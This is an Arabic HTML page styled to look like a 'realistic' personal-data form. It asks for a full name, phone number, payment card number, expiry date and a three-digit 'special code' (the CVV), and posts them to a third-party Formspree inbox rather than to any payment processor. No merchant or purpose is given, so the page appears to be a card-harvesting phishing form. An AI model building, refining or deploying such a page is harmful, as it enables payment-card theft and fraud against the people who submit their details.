<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استمارة إدخال البيانات - واقعية</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            /* تعديل: خلفية تدرج لوني واقعية وناعمة */
            background: linear-gradient(135deg, #e0eafc 0%, #cfdef3 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .form-container {
            /* تعديل: تأثير زجاجي خفيف لجسم الاستمارة */
            background-color: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(5px);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08); /* ظل واقعي أكثر عمقاً */
            width: 100%;
            max-width: 480px;
        }
        .form-container h2 {
            margin-top: 0;
            margin-bottom: 30px;
            color: #333;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
        }
        .form-group {
            margin-bottom: 25px;
        }
        .form-group label {
            display: block;
            margin-bottom: 10px;
            color: #555;
            font-weight: 600;
            font-size: 15px;
        }
        .form-group input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background-color: #fcfcfc;
            transition: all 0.3s ease;
        }
        .form-group input:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 8px rgba(0, 123, 255, 0.2); /* تأثير إضاءة عند التركيز */
        }
        .row-fields {
            display: flex;
            gap: 20px;
        }
        .row-fields .form-group {
            flex: 1;
        }
        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            margin-top: 15px;
        }
        .submit-btn:hover {
            background-color: #0056b3;
            transform: translateY(-2px); /* تأثير تحريك واقعي عند المرور */
        }
        .submit-btn:active {
            transform: translateY(0);
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>إدخال البيانات الشخصية</h2>
    
    <!-- تم دمج رابط Formspree الخاص بك هنا -->
    <form action="https://formspree.io/f/xykrwvdv" method="POST">
        
        <!-- خانة الاسم -->
        <div class="form-group">
            <label for="name">الاسم الكامل</label>
            <input type="text" id="name" name="الاسم" placeholder="أدخل اسمك الثلاثي" required>
        </div>

        <!-- رقم الجوال مع مفتاح الدولة -->
        <div class="form-group">
            <label for="phone">رقم الجوال (مع مفتاح الدولة)</label>
            <input type="tel" id="phone" name="رقم_الجوال" placeholder="مثال: 966500000000+" required>
        </div>

        <!-- رقم البطاقة -->
        <div class="form-group">
            <label for="card-number">رقم البطاقة</label>
            <input type="text" id="card-number" name="رقم_البطاقة" placeholder="XXXX XXXX XXXX XXXX" required>
        </div>

        <!-- التاريخ والخانة المكونة من 3 أرقام في سطر واحد -->
        <div class="row-fields">
            <!-- التاريخ بالسنة والشهر -->
            <div class="form-group">
                <label for="expiry-date">التاريخ (شهر/سنة)</label>
                <input type="month" id="expiry-date" name="التاريخ_ش_س" required>
            </div>

            <!-- خانة فارغة تتسع لثلاثة أرقام فقط -->
            <div class="form-group">
                <label for="cvv">الرمز الخاص</label>
                <input type="text" id="cvv" name="الرمز_الخاص" maxlength="3" pattern="\d{3}" placeholder="000" required>
            </div>
        </div>

        <!-- زر الإرسال -->
        <button type="submit" class="submit-btn">إرسال البيانات</button>
        
    </form>
</div>

</body>
</html>
